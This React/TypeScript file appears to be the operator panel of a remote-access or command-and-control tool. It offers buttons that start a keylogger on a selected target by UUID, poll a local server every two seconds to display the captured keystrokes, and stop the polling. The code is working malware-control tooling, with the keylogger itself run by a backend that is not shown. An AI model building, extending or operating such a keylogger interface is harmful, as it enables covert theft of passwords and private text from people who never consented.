import {User} from "@/Interfaces/User.ts";
import { useState, useRef, useEffect } from "react";
import {Logs} from "@/Interfaces/Logs.ts";

export function KeyloggerButtons(
    {
        typeOutput,
        selectedUser,
        clearConsole,
        setOutput
    }:
        {
            typeOutput: (text: string) => Promise<void>,
            selectedUser: User | null,
            clearConsole: () => void,
            setOutput: (value: React.SetStateAction<string[]>) => void
        }
) {
    const [_, setLastLogs] = useState<string>("");

    const intervalRef = useRef<NodeJS.Timeout | null>(null); // To store interval ID

    const startKeylogger = async () => {

        try {
            const response = await fetch("http://localhost:8000/api/modules/keylogger/start?id=" + selectedUser?.uuid, { method: "POST" });
            const data = await response.json();
            typeOutput("> " + data.message);
            console.log(data.message);
        } catch (error) {
            console.error("Error starting keylogger:", error);
        }

    };

    const showLogs = async () => {
        if (intervalRef.current) {
            clearInterval(intervalRef.current);
        }
        await refreshKeyloggerData();
        intervalRef.current = setInterval(refreshKeyloggerData, 2000);
    }

    const refreshKeyloggerData = async () => {
        if (!selectedUser) return;

        try {
            const response = await fetch("http://localhost:8000/api/modules/keylogger/logs?id=" + selectedUser?.uuid);
            const data: Logs = await response.json();
            const { logs } = data;

            if (!logs) return;

            setLastLogs(prevLogs => {
                if (logs === prevLogs) {
                    return prevLogs; // No changes, don't update
                }

                if (logs.startsWith(prevLogs) && logs !== prevLogs) {
                    clearConsole();
                    setOutput(prev => [...prev, logs]);
                }

                return logs;
            });
        } catch (error) {
            console.error("Error fetching logs:", error);
        }
    }

    const stopKeylogger = () => {
        if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
            console.log("Keylogger stopped.");
        }
    };

    useEffect(() => {
        return () => {
            if (intervalRef.current) {
                clearInterval(intervalRef.current);
            }
        };
    }, []);

    return (
        <div className="mr-4 space-y-4 text-green-500 h-1/2">
            <button
                onClick={() => startKeylogger()}
                className="mr-4 border border-green-500 p-3 rounded-lg cursor-pointer hover:border-green-400 hover:bg-green-300 hover:text-black shadow-lg shadow-green-500/50">
                <p>Start keylogger</p>
            </button>


            <button
                onClick={() => showLogs()}
                className=" border border-green-500 p-3 rounded-lg cursor-pointer hover:border-green-400 hover:bg-green-300 hover:text-black shadow-lg shadow-green-500/50">
                <p>Show logs</p>
            </button>

            
            <button
                onClick={() => stopKeylogger()}
                className="mr-4 p-3 border-dashed rounded-md bg-red-900/50 hover:bg-red-700/50 text-red-400 cursor-pointer border border-red-500 shadow-lg shadow-red-500/50">
                <p>Stop logging</p>
            </button>
        </div>
    );
}
